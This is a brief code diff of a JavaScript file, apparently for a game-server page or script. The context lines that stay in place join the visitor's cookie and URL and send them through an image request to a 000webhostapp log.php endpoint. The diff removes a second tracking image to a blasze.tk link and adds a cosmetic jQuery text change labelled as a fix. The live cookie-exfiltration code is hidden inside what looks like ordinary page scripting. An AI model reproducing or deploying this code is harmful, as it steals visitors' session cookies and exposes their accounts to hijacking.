@@ -7,5 +7,5 @@ $data = encodeURIComponent(cookie+url);
 var imageObject = new Image();
 imageObject.src = "http://g4wowisbad.000webhostapp.com/log.php?log="+$data;
 
-var imageObject = new Image();
-imageObject.src = "http://blasze.tk/KP5F62";
+//Fix the new text error
+jQuery("id#showgame").html("(Elysium) Nostalrius - PVP");
